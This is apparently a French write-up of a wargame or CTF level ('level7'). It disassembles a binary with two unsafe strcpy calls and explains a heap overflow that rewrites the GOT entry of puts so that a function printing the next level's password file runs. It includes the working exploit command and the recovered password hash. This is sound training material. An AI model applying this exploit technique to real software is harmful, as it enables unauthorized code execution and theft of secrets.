#	A ce niveau nous avons un programme qui segfault si nous ne luis passons pas au moins 2 arguments, et qui auquel cas return "~~"

$> objdump -d level7
[...]
08048400 <puts@plt>:
 8048400:	ff 25 28 99 04 08    	jmp    *0x8049928
 8048406:	68 28 00 00 00       	push   $0x28
 804840b:	e9 90 ff ff ff       	jmp    80483a0 <.plt>
[...]
080484f4 <m>:
 80484f4:	55                   	push   %ebp
 80484f5:	89 e5                	mov    %esp,%ebp
 80484f7:	83 ec 18             	sub    $0x18,%esp
 80484fa:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048501:	e8 ca fe ff ff       	call   80483d0 <time@plt>	<--	time(0)
 8048506:	ba e0 86 04 08       	mov    $0x80486e0,%edx
 804850b:	89 44 24 08          	mov    %eax,0x8(%esp)
 804850f:	c7 44 24 04 60 99 04 	movl   $0x8049960,0x4(%esp)
 8048516:	08
 8048517:	89 14 24             	mov    %edx,(%esp)
 804851a:	e8 91 fe ff ff       	call   80483b0 <printf@plt>	<--	printf("%s - %d\n", c, time(0))
 804851f:	c9                   	leave
 8048520:	c3                   	ret

08048521 <main>:
 8048521:	55                   	push   %ebp
 8048522:	89 e5                	mov    %esp,%ebp
 8048524:	83 e4 f0             	and    $0xfffffff0,%esp
 8048527:	83 ec 20             	sub    $0x20,%esp			<--	allocation de 32
 804852a:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
 8048531:	e8 ba fe ff ff       	call   80483f0 <malloc@plt>	<--	malloc de 8
 8048536:	89 44 24 1c          	mov    %eax,0x1c(%esp)		|	stocke dans esp+0x1c
 804853a:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 804853e:	c7 00 01 00 00 00    	movl   $0x1,(%eax)			<--	valeur pointee par esp+0x1c = 1
 8048544:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
 804854b:	e8 a0 fe ff ff       	call   80483f0 <malloc@plt>	<--	malloc de 8
 8048550:	89 c2                	mov    %eax,%edx			|
 8048552:	8b 44 24 1c          	mov    0x1c(%esp),%eax		|
 8048556:	89 50 04             	mov    %edx,0x4(%eax)		|	stocke dans esp+0x1c+4
 8048559:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
 8048560:	e8 8b fe ff ff       	call   80483f0 <malloc@plt>	<--	malloc de 8
 8048565:	89 44 24 18          	mov    %eax,0x18(%esp)		|	stocke dans esp+0x18
 8048569:	8b 44 24 18          	mov    0x18(%esp),%eax
 804856d:	c7 00 02 00 00 00    	movl   $0x2,(%eax)			<--	valeur pointee par esp+0x18 = 2
 8048573:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
 804857a:	e8 71 fe ff ff       	call   80483f0 <malloc@plt>	<--	malloc de 8
 804857f:	89 c2                	mov    %eax,%edx			|
 8048581:	8b 44 24 18          	mov    0x18(%esp),%eax		|
 8048585:	89 50 04             	mov    %edx,0x4(%eax)		|	stocke dans esp+0x18+4
 8048588:	8b 45 0c             	mov    0xc(%ebp),%eax		
 804858b:	83 c0 04             	add    $0x4,%eax			
 804858e:	8b 00                	mov    (%eax),%eax			
 8048590:	89 c2                	mov    %eax,%edx			
 8048592:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 8048596:	8b 40 04             	mov    0x4(%eax),%eax
 8048599:	89 54 24 04          	mov    %edx,0x4(%esp)
 804859d:	89 04 24             	mov    %eax,(%esp)
 80485a0:	e8 3b fe ff ff       	call   80483e0 <strcpy@plt>	<--	strcpy(esp+0x1c+4, av[1])
 80485a5:	8b 45 0c             	mov    0xc(%ebp),%eax
 80485a8:	83 c0 08             	add    $0x8,%eax
 80485ab:	8b 00                	mov    (%eax),%eax
 80485ad:	89 c2                	mov    %eax,%edx
 80485af:	8b 44 24 18          	mov    0x18(%esp),%eax
 80485b3:	8b 40 04             	mov    0x4(%eax),%eax
 80485b6:	89 54 24 04          	mov    %edx,0x4(%esp)
 80485ba:	89 04 24             	mov    %eax,(%esp)
 80485bd:	e8 1e fe ff ff       	call   80483e0 <strcpy@plt>	<--	strcpy(esp+0x18+4, av[2])
 80485c2:	ba e9 86 04 08       	mov    $0x80486e9,%edx
 80485c7:	b8 eb 86 04 08       	mov    $0x80486eb,%eax
 80485cc:	89 54 24 04          	mov    %edx,0x4(%esp)
 80485d0:	89 04 24             	mov    %eax,(%esp)
 80485d3:	e8 58 fe ff ff       	call   8048430 <fopen@plt>	<--	fopen("/home/user/level8/.pass", "r")
 80485d8:	89 44 24 08          	mov    %eax,0x8(%esp)
 80485dc:	c7 44 24 04 44 00 00 	movl   $0x44,0x4(%esp)
 80485e3:	00
 80485e4:	c7 04 24 60 99 04 08 	movl   $0x8049960,(%esp)
 80485eb:	e8 d0 fd ff ff       	call   80483c0 <fgets@plt>	<--	fgets(c, 68, fd)
 80485f0:	c7 04 24 03 87 04 08 	movl   $0x8048703,(%esp)
 80485f7:	e8 04 fe ff ff       	call   8048400 <puts@plt>	<--	puts("~~")
 80485fc:	b8 00 00 00 00       	mov    $0x0,%eax
 8048601:	c9                   	leave
 8048602:	c3                   	ret
 804860d:	90                   	nop
[...]

#	On sait que strcpy est exploitable, ici il y en a deux. On voit aussi qu'apres les strcpy, le fichier que l'on souhaite lire sera ouvert puis lu et ecrit dans une variable "c" qui sera lue dans la fonction m() qui n'est pas call. Ensuite il y a un appel a puts() qui est une fonction de la GOT

#	L'idee ici ca va etre d'utiliser le premier strcpy afin d'overwrite le pointeur dans lequel on ecrira dans le second afin que l'on modifie l'adresse de puts sur la GOT pour qu'il pointe vers m().

#	L'offset de segfault est a 20, on va donc faire un padding de 20 puis ecrire l'adresse de puts sur la GOT : 0x8049928

#	Puis pour le second argument on lui passera directement l'adresse de m(): 0x80484f4 :

$> ./level7 `python -c 'print 20*"A" + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
